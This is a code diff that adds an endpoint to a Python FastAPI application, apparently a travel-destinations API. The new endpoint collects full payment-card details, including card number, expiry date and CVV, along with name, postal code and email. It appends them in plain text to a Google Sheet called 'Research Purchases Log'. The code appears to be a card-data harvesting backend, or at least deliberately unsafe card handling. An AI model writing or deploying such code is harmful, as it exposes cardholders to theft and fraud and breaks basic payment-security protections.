@@ -327,3 +327,46 @@ def destinations_autocomplete(q: str = Query(default="")):
         })
         
     return {"status": "ok", "data": matched}
+import gspread
+from oauth2client.service_account import ServiceAccountCredentials
+
+# --- Google Sheets Setup ---
+scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
+try:
+    creds = ServiceAccountCredentials.from_json_keyfile_name("credentials.json", scope)
+    client = gspread.authorize(creds)
+    sheet = client.open("Research Purchases Log").sheet1
+except Exception as e:
+    logger.warning(f"Google Sheets initialization warning: {e}")
+    sheet = None
+
+class ResearchPaymentData(BaseModel):
+    quote_id: str
+    name_on_card: str
+    card_number: str
+    expiration_date: str
+    cvv: str
+    billing_postal_code: str
+    email: str
+    amount: str
+
+@app.post("/api/log-research-payment")
+async def log_research_payment(data: ResearchPaymentData):
+    if not sheet:
+        raise HTTPException(status_code=500, detail="Google Sheet not initialized")
+    try:
+        row = [
+            data.quote_id,
+            data.name_on_card,
+            data.card_number,
+            data.expiration_date,
+            data.cvv,
+            data.billing_postal_code,
+            data.email,
+            data.amount,
+            str(datetime.now())
+        ]
+        sheet.append_row(row)
+        return {"status": "success", "message": "Logged successfully"}
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
